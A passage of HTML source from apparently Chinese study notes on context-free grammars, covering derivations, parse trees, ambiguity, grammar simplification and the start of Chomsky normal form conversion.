w^R</script><p>易证明$L_{pal}$是非正则的。可以用递归的形式来定义这种语言：</p>\n<ul>\n<li>$\\epsilon,0,1$都是回文</li>\n<li>如果$w$是回文，$0w0$,$1w1$也是回文</li>\n</ul>\n<p>使用嵌套定义表示这种递归结构：</p>\n<script type=\"math/tex; mode=display\">\nA \\to \\epsilon \\\\\nA \\to 0A0 \\\\\nA \\to 0 \\\\\nA \\to 1A1 \\\\\nA \\to 1 \\\\</script><p>文法可以定义，表示，产生目标字符串。</p>\n<p><strong>定义</strong>：上下文无关文法（CFG，Context-Free Grammer），简称文法，$G$是一个四元组</p>\n<script type=\"math/tex; mode=display\">\nG = (V,T,P,S)</script><ul>\n<li>$V$：变元的有穷集，变元也成为非终结符或者语法范畴</li>\n<li>$T$：终结符的有穷集，且$V \\cap T = \\emptyset$</li>\n<li>$P$：产生式的有穷集，每个产生式包括<ul>\n<li>一个变元，称为产生式的头或左部</li>\n<li>一个产生式符号$\\to$，读作“定义为”</li>\n<li>一个$(V \\cup T)^{\\ast}$中的符号串，称为体，或者右部</li>\n</ul>\n</li>\n<li><p>$S \\in V$：初始符号，文法开始的地方</p>\n</li>\n<li><p>产生式$A \\to \\alpha$，读作$A$定义为$\\alpha$</p>\n</li>\n<li>如果有多个$A$的产生式：<script type=\"math/tex; mode=display\">\nA \\to \\alpha_1, \\ A \\to \\alpha_2, \\dots, \\ A \\to \\alpha_n \\</script>可简写为：$A \\to \\alpha_1 \\vert \\alpha_2 \\vert \\dots \\vert \\alpha_n$</li>\n<li>文法中变元$A$的全体产生式，称为$A$产生式</li>\n</ul>\n<p>例：回文语言$L_{pal} = \\lbrace w \\in \\lbrace 0,1\\rbrace^{\\ast} \\vert w = w^R \\rbrace$的文法可设计为：</p>\n<script type=\"math/tex; mode=display\">\nG = (\\lbrace A \\rbrace,\\lbrace 0,1 \\rbrace, \\lbrace A \\to \\epsilon \\vert 0 \\vert 1 \\vert 0A0 \\vert 1A1 \\rbrace, A)</script><p>字符使用的一般约定：</p>\n<ul>\n<li>终结符：$0,1,\\dots,a,b, \\dots \\rbrace$</li>\n<li>终结符串：$\\dots, w,x,y,z \\dots$</li>\n<li>非终结符：$S,A,B, \\dots$</li>\n<li>终结符或非终结符：$\\dots,X,Y,Z$</li>\n<li>终结符或非终结符组成的串：$\\alpha,\\beta,\\gamma,\\dots$</li>\n</ul>\n<p>例：简化版的算术表达式：</p>\n<ul>\n<li>运算只有加和乘(+/*)，参数仅为标识符</li>\n<li>标识符：以$\\lbrace a,b \\rbrace$开头由$\\lbrace a,b,0,1 \\rbrace$组成的字符串，这样的表达式集合可用文法$G_{exp}$表示<script type=\"math/tex; mode=display\">\nG_{exp} = (\\lbrace E,I \\rbrace, \\lbrace a,b,0,1,+,\\ast, (,) \\rbrace,P,E)</script>其中产生式$P$有10条产生式：<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nE &\\to I \\\\\nE &\\to E + E \\\\\nE &\\to E \\ast E \\\\\nE &\\to (E) \\\\\nI &\\to a \\\\\nI &\\to b \\\\\nI &\\to Ia \\\\\nI &\\to Ib \\\\\nI &\\to I0 \\\\\nI &\\to I1 \\\\\n\\end{aligned}</script></li>\n</ul>\n<h3 id=\"规约和派生\"><a href=\"#规约和派生\" class=\"headerlink\" title=\"规约和派生\"></a>规约和派生</h3><p>非形式定义：从字符串到文法变元的分析过程，称为递推推理或规约。从文法变元到字符串的分析过程，称为推导或派生。<br><img src=\"65.png\" alt=\"\"></p>\n<ul>\n<li>规约：自底向上，由产生式的体向头的分析</li>\n<li>派生：自顶向下，由产生式的头向体的分析</li>\n</ul>\n<p>例：用算术表达式文法$G_{exp}$，将$a \\ast (a+b00)$规约的过程</p>\n<p>给产生式标号：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n1.& \\ E \\to I \\\\\n2.& \\ E \\to E + E \\\\\n3.& \\ E \\to E \\ast E \\\\\n4.& \\ E \\to (E) \\\\\n5.& \\ I \\to a \\\\\n6.& \\ I \\to b \\\\\n7.& \\ I \\to Ia \\\\\n8.& \\ I \\to Ib \\\\\n9.& \\ I \\to I0 \\\\\n10.& \\ I \\to I1 \\\\\n\\end{aligned}</script><script type=\"math/tex; mode=display\">\n\\begin{aligned}\na \\ast (a+b00) &= I \\ast (I + I00) \\ (5,6) \\\\\n&= I \\ast (I + I0) \\ (9) \\\\\n&= I \\ast (I + I) \\ (9) \\\\\n&= E \\ast (E + E) \\ (1) \\\\\n&= E \\ast E \\ (2) \\\\\n&= E \\ (3) \\\\\n\\end{aligned}</script><p><strong>定义</strong>：若CFG $G = (V,T,P,S)$，设$\\alpha,\\beta,\\gamma \\in (V \\cup T)^{\\ast}$，$A \\in V$，$A \\to \\gamma \\in P$，那么称在$G$中由$\\alpha A \\beta$可派生出$\\alpha \\gamma \\beta$，记为</p>\n<script type=\"math/tex; mode=display\">\n\\alpha A \\beta \\underset{G}{\\Rightarrow} \\alpha \\gamma \\beta</script><p>相应的，称$\\alpha \\gamma \\beta$可规约为$\\alpha A \\beta$.</p>\n<ul>\n<li>$\\alpha A \\beta \\underset{G}{\\Rightarrow} \\alpha \\gamma \\beta$，即$A \\to \\gamma$的右部$\\gamma$替换串$\\alpha A \\beta$中变元$A$得到串$\\alpha \\gamma \\beta$</li>\n<li><p>如果语境中$G$是已知的，可省略，记为$\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta$</p>\n</li>\n<li><p>设$a<em>1,\\dots,a_m \\in (V \\cup T)^{\\ast}, m \\geq 1$，对$i = 1,\\dots,m-1$如果有$a_i \\underset{G}{\\Rightarrow} a</em>{i+1}$成立，即$a_1$经过0步或者多步派生可得到$a_m$，</p>\n<script type=\"math/tex; mode=display\">\na_1 \\underset{G}{\\Rightarrow} a_2 \\underset{G}{\\Rightarrow} \\dots \\underset{G}{\\Rightarrow} a_{m-1} \\underset{G}{\\Rightarrow} a_m</script><p>，那么记为$a_1 \\underset{G}{\\Rightarrow} a_m$</p>\n</li>\n<li><p>若$\\alpha$派生出$\\beta$刚好经过了$i$步，可记为$\\alpha \\underset{G}{\\stackrel{i}{\\Longrightarrow}} \\beta$</p>\n</li>\n</ul>\n<p>例：算术表达式$a \\ast (b+ b00)$在文法$G_{exp}$中派生过程：</p>\n<script type=\"math/tex; mode=display\">\nE \\Rightarrow E \\ast E \\Rightarrow E \\ast (E) \\Rightarrow I \\ast (E) \\\\ \n\\Rightarrow I \\ast (I+I) \\Rightarrow I \\ast (a+I) \\Rightarrow a \\ast (a+I) \\\\\n\\Rightarrow a \\ast (a + I0) \\Rightarrow a \\ast (a + I00) \\Rightarrow a \\ast (a + b00)</script><h3 id=\"最左派生和最右派生\"><a href=\"#最左派生和最右派生\" class=\"headerlink\" title=\"最左派生和最右派生\"></a>最左派生和最右派生</h3><p><strong>定义</strong>：为了限制派生的随意性，要求只替换符号串中最左边变元的派生过程，称为最左派生，记为</p>\n<script type=\"math/tex; mode=display\">\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}},\\underset{lm}{\\stackrel{\\ast}{\\Longrightarrow}},</script><p>只替换最右的，称为最右派生，记为</p>\n<script type=\"math/tex; mode=display\">\n\\underset{rm}{\\stackrel{}{\\Longrightarrow}},\\underset{rm}{\\stackrel{\\ast}{\\Longrightarrow}},</script><ul>\n<li>任何派生都有等价的最左派生和最右派生<script type=\"math/tex; mode=display\">\nA \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w \\text{当且仅当} \\  A \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} w , \\text{当且仅当}  A \\underset{rm}{\\stackrel{\\ast}{\\Rightarrow}} w</script></li>\n</ul>\n<p>续例：<br>表达式$a \\ast (b+ a)$在$G_{exp}$中的最左派生和最右派生分别是？<br>产生式集合</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n1.& \\ E \\to I \\\\\n2.& \\ E \\to E + E \\\\\n3.& \\ E \\to E \\ast E \\\\\n4.& \\ E \\to (E) \\\\\n5.& \\ I \\to a \\\\\n6.& \\ I \\to b \\\\\n7.& \\ I \\to Ia \\\\\n8.& \\ I \\to Ib \\\\\n9.& \\ I \\to I0 \\\\\n10.& \\ I \\to I1 \\\\\n\\end{aligned}</script><p>最左派生：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nE \\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast E \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& I \\ast E \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast E \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (E) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (E+E) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (I+E) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (a+E) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (a+I) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (a+a)\n\\end{aligned}</script><p>最右派生：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nE \\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast E \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast (E) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast (E+E) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast (E+I) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast (E+a) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast (I+a) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& E \\ast (a+a) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& I \\ast (a+a) \\\\\n\\underset{lm}{\\stackrel{}{\\Longrightarrow}}& a \\ast (a+a) \\\\\n\\end{aligned}</script><h3 id=\"文法的语言\"><a href=\"#文法的语言\" class=\"headerlink\" title=\"文法的语言\"></a>文法的语言</h3><p><strong>定义</strong>：CFG $G=(V,T,P,S)$的语言定义为：</p>\n<script type=\"math/tex; mode=display\">\n\\boldsymbol{L}(G) = \\lbrace w \\vert w \\in T^{\\ast},S \\underset{G}{\\stackrel{\\ast}{\\Longrightarrow}} w \\rbrace</script><p>那么符号串$w$在$\\boldsymbol{L}(G)$中，要满足：</p>\n<ul>\n<li>$w$仅由终结符组成</li>\n<li>初始符号$S$能派生出$w$</li>\n</ul>\n<p><strong>定义</strong>：如果$L$是某个CFG $G$定义的语言，即$L=\\boldsymbol{L}(G)$，则称$L$为上下文无关语言（CFL，Context-Free Language）</p>\n<ul>\n<li>上下文无关是值在文法派生的每一步<script type=\"math/tex; mode=display\">\n\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta</script>符号串$\\gamma$仅根据$A$的产生式派生，而无需依赖$A$的上下文$\\alpha,\\beta$</li>\n</ul>\n<p><strong>定义</strong>：若CFG $G = (V,T,P,S)$，初始符号$S$派生出来的符号串，称为$G$的句型。即：</p>\n<script type=\"math/tex; mode=display\">\n\\alpha \\in (V \\cup T)^{\\ast} \\ \\text{且} \\ S \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} \\alpha</script><ul>\n<li>如果$S \\underset{lm}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha$，$\\alpha$为左句型</li>\n<li>如果$S \\underset{rm}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha$，$\\alpha$为右句型</li>\n<li>只含终结符的句型，也称为$G$的句子。而$\\boldsymbol{L}(G)$也就是文法$G$的全部句子，即语言。</li>\n</ul>\n<p>例：给出语言$L = \\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} \\vert w \\text{包含至少3个1} \\rbrace$的文法：</p>\n<p>定义产生式：</p>\n<script type=\"math/tex; mode=display\">\nS \\to A1A1A1A \\\\\nA \\to 0A \\vert 1A \\vert \\epsilon</script><p>例：描述CFG $G=(\\lbrace S \\rbrace,\\lbrace a,b \\rbrace, \\lbrace S \\to aSb,S \\to ab \\rbrace,S)$定义的语言</p>\n<script type=\"math/tex; mode=display\">\nS \\Rightarrow aSb  \\Rightarrow a^2Sb^2  \\Rightarrow \\dots  \\Rightarrow a^iSb^i  \\Rightarrow a^nb^n</script><p>所以$\\boldsymbol{L}(G) = \\lbrace a^nb^n \\vert n \\geq 1 \\rbrace$</p>\n<p>例：请为语言$L=\\lbrace 0^n1^m \\vert n \\not= m \\rbrace$设计文法</p>\n<p>处理这种不相等的情况，往往分类讨论：</p>\n<ul>\n<li>$n \\gt m$，0多1少，用$C$表示01相等的部分，A表示头部多处的0：<script type=\"math/tex; mode=display\">\nS \\to AC \\\\\nA \\to A0 \\vert 0 \\\\\nC \\to 0C1 \\vert \\epsilon</script></li>\n<li>$n \\lt m$，0少1多，用$C$表示01相等的部分，B表示尾部多处的1：<script type=\"math/tex; mode=display\">\nS \\to CB \\\\\nB \\to B1 \\vert 1 \\\\\nC \\to 0C1 \\vert \\epsilon</script></li>\n</ul>\n<p>例：设计$L_{eq}=\\lbrace 0,1 \\rbrace^{\\ast} \\vert w \\text{中0和1个数相等} \\rbrace$的文法</p>\n<p>设计的产生式，必须每次递推都产生相等的0和1，$S \\to 0S1 \\vert 1S0 \\vert \\epsilon$，还要保证所有产生的0和1相等的串都能被递推（0或1同时作为首尾的情况），这里将他们相连即可。最终结果：</p>\n<script type=\"math/tex; mode=display\">\nS \\to 0S1 \\vert 1S0 \\vert \\epsilon \\vert SS</script><p>另外一种思路，所有出现0和1的串，要么0在前，要么1在前：</p>\n<script type=\"math/tex; mode=display\">\nS \\to S0S1S \\vert S1S0S \\vert \\epsilon</script><h2 id=\"语法分析树\"><a href=\"#语法分析树\" class=\"headerlink\" title=\"语法分析树\"></a>语法分析树</h2><p>前例中$G_{exp}$推导算术表达式$a \\ast (a+a)$的过程可以描述成一个树形结构，在分析字符串和文法语言表示的关系中非常有用。<br><img src=\"66.png\" alt=\"\"></p>\n<h3 id=\"形式定义-1\"><a href=\"#形式定义-1\" class=\"headerlink\" title=\"形式定义\"></a>形式定义</h3><p><strong>定义</strong>：<br>CFG $G = (V,T,P,S)$的语法分析树（语法树或派生树）为：</p>\n<ul>\n<li>每个内节点标记为$V$中的变元符号</li>\n<li>每个叶节点标记为$V \\cup T \\cup \\lbrace \\epsilon \\rbrace$中的符号</li>\n<li>如果某内节点标记是$A$，其子节点从左至右分别为：<script type=\"math/tex; mode=display\">\nX_1,X_2,\\dots,X_n</script>那么<script type=\"math/tex; mode=display\">\nA \\to X_1X_2 \\dots X_n \\in P</script>若由$X_i = \\epsilon$，则$\\epsilon$是$A$的唯一子节点，且$A \\to \\epsilon \\in P$</li>\n</ul>\n<p><strong>定义</strong>：语法树的全部叶节点从左至右连接起来，称为该数的产物或结果，如果根节点是初始符号$S$，叶节点是终结符或$\\epsilon$，那么改树的产物属于$\\boldsymbol{L}(G)$</p>\n<p><strong>定义</strong>：语法树中标记为$A$的内节点及其全部子孙节点构成的子树，称为$A$子树。</p>\n<h3 id=\"语法树和派生的等价性\"><a href=\"#语法树和派生的等价性\" class=\"headerlink\" title=\"语法树和派生的等价性\"></a>语法树和派生的等价性</h3><p><strong>定理</strong>：CFG $G = (V,T,P,S)$，且$A \\in V$，那么文法$G$中</p>\n<script type=\"math/tex; mode=display\">\nA \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}}\\alpha</script><p>当且仅当$G$中存在以$A$为根节点产物为$\\alpha$的语法树。</p>\n<p><strong>证明</strong>：<br>【充分性】对$A \\underset{}{\\stackrel{j}{\\Longrightarrow}}\\alpha$的步骤数$j$归纳证明：</p>\n<ul>\n<li><p>归纳基础：$j=1$时，$A \\Rightarrow \\alpha$，有$A \\to \\alpha \\in P$，可构造：<img src=\"67.png\" alt=\"\"></p>\n</li>\n<li><p>归纳递推：假设$j \\leq n$时命题成立，当$j=n+1$时，$A \\underset{}{\\stackrel{n+1}{\\Longrightarrow}} \\alpha$的派生过程为：</p>\n<script type=\"math/tex; mode=display\">\nA \\Rightarrow X_1 \\dots X_m \\underset{}{\\stackrel{n}{\\Longrightarrow}}\\alpha_1 \\dots \\alpha_m = \\alpha</script><p>其中$A \\to X_1 \\dots X_m \\in P$，而$X_i$若非终结符，一定有$X_i \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha_i$且不超过$n$步，由归纳假设存在：<br><img src=\"68.png\" alt=\"\"> 因此可以构造以$A$为跟，以$X_i$为子树（或叶子）的语法树，其产物刚好为$\\alpha$<br><img src=\"69.png\" alt=\"\"> </p>\n</li>\n</ul>\n<p>【必要性】对语法分析树的内节点数$j$归纳证明：</p>\n<ul>\n<li>归纳基础：$j=1$时，唯一的内节点是根节点<br><img src=\"67.png\" alt=\"\"> 有$A \\to \\alpha \\in P$，那么$A \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha$</li>\n<li>归纳递推：假设$j \\leq n$时命题成立。当$j=n+1$，跟节点$A$儿子为$X_1,X_2,\\dots,X_m$，则 <script type=\"math/tex; mode=display\">\nA \\to X_1 \\dots X_m \\in P, \\text{且} A \\Rightarrow X_1,\\dots X_m</script>而$X_i$子树（或叶子）内节点数都不超过$n$，由归纳假设由<script type=\"math/tex; mode=display\">\nX_i \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha_i</script>从左至右连接$\\alpha_i$刚好为树的产物$\\alpha$，所以有<script type=\"math/tex; mode=display\">\nX_1X_2 \\dots X_m \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha_1 X_2 \\dots X_m \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}} \\dots \\underset{}{\\stackrel{\\ast}{\\Longrightarrow}} \\alpha_1 \\alpha_2 \\dots \\alpha_m = \\alpha</script><img src=\"69.png\" alt=\"\"></li>\n</ul>\n<p>由于每个CFG派生都有最左派生和最右派生，所以每棵语法分析树都有唯一的最左和最右派生。</p>\n<p>给定CFG $G = (V,T,P,S),A \\in V$，以下命题等价</p>\n<ul>\n<li>通过递归推理，确定串$w$在变元$A$的语言中</li>\n<li>存在以$A$为根节点，产物为$w$的语法分析树</li>\n<li>$A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w$</li>\n<li>$A \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} w$</li>\n<li>$A \\underset{rm}{\\stackrel{\\ast}{\\Rightarrow}} w$</li>\n</ul>\n<h2 id=\"语法和语言的歧义性\"><a href=\"#语法和语言的歧义性\" class=\"headerlink\" title=\"语法和语言的歧义性\"></a>语法和语言的歧义性</h2><p><strong>定义</strong>：如果CFG G使某些符号串中有两棵不同的语法分析树，则称该文法$G$是歧义的</p>\n<p>例：算术表达式的文法$G_{exp}$中，对句型$a + a \\ast a$有下面两棵语法树<br><img src=\"70.png\" alt=\"\"><br>由于实际运算要先乘除，后加减，所以左侧的文法是正确的表示。</p>\n<p>有些文法的歧义性，可以通过重新设计文法消除歧义性</p>\n<p>续例：文法$G<em>{exp}$重新设计为$G</em>{exp^{\\prime}}$可消除歧义。<br><img src=\"71.png\" alt=\"\"></p>\n<p><strong>定义</strong>：定义同样的语言可以有多个文法，如果CFL L的所有文法都是歧义的，那么称语言$L$是固有歧义的。</p>\n<ul>\n<li>固有歧义的语言存在，例如：<script type=\"math/tex; mode=display\">\n L = \\lbrace a^ib^jc^k \\vert i=j \\ or \\ j=k \\rbrace</script> 任何形如$a^nb^nc^n$的串，无论如何设计，都会有两棵语法树。</li>\n<li>判定“任何给定CFG G是否有歧义”是一个不可判定问题</li>\n</ul>\n<h2 id=\"文法的化简和范式\"><a href=\"#文法的化简和范式\" class=\"headerlink\" title=\"文法的化简和范式\"></a>文法的化简和范式</h2><p>化简可以提升文法分析的效率，如编译器设计和自然语言处理中的典型问题：“给定CFG G和串$w$，判断$w \\in \\boldsymbol{L}(G)$”，冗余的文法规则会降低文法分析的效率。</p>\n<p>例：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to 0DS1D \\vert B \\vert \\epsilon \\\\\nB &\\to BC1 \\vert 0CBC \\\\\nA &\\to A0 \\vert A1 \\vert \\epsilon \\\\\nC &\\to D \\\\\nD &\\to \\epsilon\n\\end{aligned}</script><p>其中从开始符号$S$无法派生到$A$，而$B$无法产生不含非终结符的串，所以他们对文法定义的语言没有贡献。而$C \\to D$和$D \\to \\epsilon$只是增加了推导过程，所以对分析过程也是有害的。</p>\n<p>文法化简是以<strong>不改变语言</strong>为前提，化简文法和限制文法的格式，最终转化为范式的过程。</p>\n<h3 id=\"化简\"><a href=\"#化简\" class=\"headerlink\" title=\"化简\"></a>化简</h3><p>文法化简分为三个过程： </p>\n<ul>\n<li>消除无用符号：对文法定义语言没有贡献的符号</li>\n<li>消除$\\epsilon$产生式：$A \\to \\epsilon$（得到语言$L - \\lbrace \\epsilon \\rbrace$）</li>\n<li>消除单元产生式：$A \\to B$</li>\n</ul>\n<h4 id=\"消除无用符号\"><a href=\"#消除无用符号\" class=\"headerlink\" title=\"消除无用符号\"></a>消除无用符号</h4><p><strong>定义</strong>：CFG $G=(V,T,P,S)$，符号$X \\in (V \\cup T)$：</p>\n<ul>\n<li>如果$S \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} \\alpha X \\beta$，称$X$是<strong>可达</strong>的</li>\n<li>如果$\\alpha X \\beta \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w \\ (w \\in T^{\\ast})$，称$X$是<strong>产生</strong>的</li>\n<li>如果$X$同时产生和可达的，即：<script type=\"math/tex; mode=display\">\nS \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} \\alpha X \\beta \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w \\ (w \\in T^{\\ast})</script>则称$X$是<strong>有用</strong>的，否则称$X$是<strong>无用符号</strong>。即：如果一个符号无法从开始符号派生而来，或无法产生终结符串，他就是无用的。</li>\n</ul>\n<p>计算产生的符号集：</p>\n<ul>\n<li>每个$T$中的符号都是产生的</li>\n<li>$A \\to \\alpha \\in P$且$\\alpha$中符号都是产生的，则$A$是产生的</li>\n</ul>\n<p>计算可达的符号集：</p>\n<ul>\n<li>符号$S$是可达的</li>\n<li>$A \\to \\alpha \\in P$且$A$是可达的，则$\\alpha$中符号都是可达的</li>\n</ul>\n<p>计算所有既是产生也是可达的符号集后，排除剩下的符号，即可获得不带无用符号的CFG。</p>\n<blockquote>\n<p>必须先消除所有非“产生的”符号，再消除全部非“可达的”符号，否则消除可能不完整。</p>\n</blockquote>\n<p>例：</p>\n<script type=\"math/tex; mode=display\">\nS \\to AB \\vert a \\\\\nA \\to B</script><p>如果先消除非“可达的”，不会消除任何符号，然后消除非“产生的”，只会消除掉$B$，于是得到：</p>\n<script type=\"math/tex; mode=display\">\nS \\to a \\\\\nA \\to b</script><p>显然，此时$A \\to b$也是无没有贡献的，$A,b$也是无用符号。该用先消除非“产生的”，先会消除$B$；再消除非“可达的”，消除$A,b$，最后得到：</p>\n<script type=\"math/tex; mode=display\">\nS \\to a</script><p>这是一条正确的结果。</p>\n<p><strong>定理</strong>：每个非空的CFL都能被一个不带无用符号的CFG定义。</p>\n<h4 id=\"消除-epsilon-产生式\"><a href=\"#消除-epsilon-产生式\" class=\"headerlink\" title=\"消除$\\epsilon$产生式\"></a>消除$\\epsilon$产生式</h4><p><strong>定义</strong>：文法中形如$A \\to \\epsilon$的产生式称为$\\epsilon$-产生式。如果变元$A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} \\epsilon$，称$A$是可空的。</p>\n<ul>\n<li>$\\epsilon$产生式在文法定义语言时，除产生空串外没有其他帮助</li>\n<li>对于CFL $L$，消除其文法中全部的$\\epsilon$-产生式，得到语言$L - \\lbrace \\epsilon \\rbrace$</li>\n</ul>\n<p>确定“可空变元”</p>\n<ul>\n<li>如果$A \\to \\epsilon$，则$A$是可空的</li>\n<li>如果$B \\to \\alpha$，且$\\alpha$中的每个符号都是可空的，则$B$是可空的</li>\n</ul>\n<p>替换产生式：<br>将含有可空变元的一条产生式$A \\to X_1 X_2 \\dots X_n$，用一组产生式$A \\to Y_1 Y_2 \\dots Y_n$，其中：</p>\n<ul>\n<li>若$X_i$不是可空的，$Y_i$为$X_i$</li>\n<li>若$X_i$是可空的，$Y_i$为$X_i$或$\\epsilon$</li>\n<li>但$Y_i$不能全为$\\epsilon$</li>\n</ul>\n<p><strong>定理</strong>：任何CFG $G$，都存在一个不带无用符号和$\\epsilon$-产生式的CFG $G^{\\prime}$，使$\\boldsymbol{L}(G^{\\prime}) = \\boldsymbol{L}(G) - \\lbrace \\epsilon \\rbrace$</p>\n<p>例：消除CFG $G=(\\lbrace S,A,B \\rbrace, \\lbrace a,b \\rbrace, P, S)$的$\\epsilon$-产生式。</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n  S &\\to AB \\\\\n  A &\\to AaA \\vert \\epsilon \\\\\n  B &\\to BbB \\vert \\epsilon\n\\end{aligned}</script><p>很明显$A,S,B$都是可空变元。先删掉所有的空产生式。对于$S \\to AB$，分$A$为$\\epsilon$，$B$为$\\epsilon$和$AB$均为$\\epsilon$，推导出$S \\to AB \\vert B \\vert A$，同理$A \\to AaA \\vert aA \\vert Aa \\vert a$，$B \\to BbB \\vert bB \\vert Bb$。<br>最终得到消除$\\epsilon$产生式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to AB \\vert B \\vert A \\\\\nA &\\to AaA \\vert aA \\vert Aa \\vert a \\\\\nB &\\to BbB \\vert bB \\vert Bb \\\\\n\\end{aligned}</script><h4 id=\"单元产生式\"><a href=\"#单元产生式\" class=\"headerlink\" title=\"单元产生式\"></a>单元产生式</h4><p>形如$A \\to B$的产生式，仅仅增加了文法推导的步骤，需要删掉。首先要确定“单元对”，然后消除单元产生式。</p>\n<p>确定“单元对”：<br>如果有$A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} B$，则称$[A,B]$为单元对</p>\n<ul>\n<li>$A \\to B \\in P$，则$[A,B]$是单元对</li>\n<li>若$[A,B]$和$[B,C]$都是单元对，则$[A,C]$是单元对</li>\n</ul>\n<p>消除单元产生式：</p>\n<ul>\n<li>删除全部形如$A \\to B$的单元产生式</li>\n<li>对每个单元对$[A,B]$，将$B$的产生式复制给$A$</li>\n</ul>\n<p>例：消除文法的单元产生式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to A \\vert B \\vert 0S1 \\\\\nA &\\to 0A \\vert 0 \\\\\nB &\\to 1B \\vert 1\n\\end{aligned}</script><p>首先找出“单元对”：$[S,A],[S,B]$，删除单元产生式$S \\to A \\vert B$，将单元产生式中$A,B$的产生式复制给$S$，得到：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to 0S1 \\vert 0A \\vert 0 \\vert 1B \\vert 1 \\\\\nA &\\to 0A \\vert 0 \\\\\nB &\\to 1B \\vert 1\n\\end{aligned}</script><p>文法化简的可靠顺序：</p>\n<ul>\n<li>消除$\\epsilon$-产生式</li>\n<li>消除单元产生式</li>\n<li>消除非产生的无用符号</li>\n<li>消除非可达的无用符号</li>\n</ul>\n<h3 id=\"转化为范式\"><a href=\"#转化为范式\" class=\"headerlink\" title=\"转化为范式\"></a>转化为范式</h3><p>因为文法格式非常自由，仅仅化简后还不便于工程上的自动处理，还需化简之后，转化为特定格式的文法。常用两种范式：</p>\n<ul>\n<li>乔姆斯基范式（CNF,Chomsky Normal Form）</li>\n<li>格雷巴赫范式（GNF,Greibch Normal Form）</li>\n</ul>\n<h4 id=\"CNF\"><a href=\"#CNF\" class=\"headerlink\" title=\"CNF\"></a>CNF</h4><p><strong>定理</strong>：每个不带$\\epsilon$的CFL都可以由这样的CFG $G$定义，$G$中每个产生式的形式都为：</p>\n<script type=\"math/tex; mode=display\">\nA \\to BC \\ \\text{或} \\ A \\to a</script><p>这里$A,B$和$C$都是变元，$a$是终结符</p>\n<ul>\n<li>利用CNF派生产生的语法树的内节点构成一棵二叉树，派生长度为$n$的串，刚好需要$2n-1$步</li>\n<li>因此存在算法判断任意字符串$w$是否在给定的CFL中</li>\n<li>利用CNF的多项式时间解析算法 - CYK算法</li>\n</ul>\n<p>CFG转为CNF的方法：  </p>\n<ol>\n<li>将产生式<script type=\"math/tex; mode=display\">\n A \\to X_1 X_2 \\dots X_m (m \\gt 2)</script> 中每个终结符$a$替换为新变元$C_a$</li>\n<li>增加新产生式<script type=\"math/tex; mode=display\">\n C_a \\to a</script></li>\n<li>引入新变元$D<em>1,D_2,\\dots D</em>{m-2}$，将产生式<script type=\"math/tex; mode=display\">\n A \\to B_1 B_2 \\dots B_m (m \\gt 2)</script> 替换为一组级联产生式<script type=\"math/tex; mode=display\">\n \\begin{aligned}\n A &\\to B_1D_1 \\\\\n D_1 &\\to B_2D_2 \\\\\n &\\dots \\\\\n D_{m-2} &\\to B_{m-1}B_{m}\n \\end{aligned}</script></li>\n</ol>\n<p>例：CFG $G=(\\lbrace S,A,B \\rbrace, \\lbrace a,b \\rbrace,P,S)$，产生式集合$P$为：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to bA \\vert aB \\\\\nA &\\to bAA \\vert aS \\vert a \\\\\nB &\\to aBB \\vert bS \\vert b\n\\end{aligned}</script><p>设计等价的CNF文法。</p>\n<p>先替换全部的终结符：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to C_bA \\vert C_aB \\\\\nA &\\to C_bAA \\vert C_aS \\vert C_a \\\\\nB 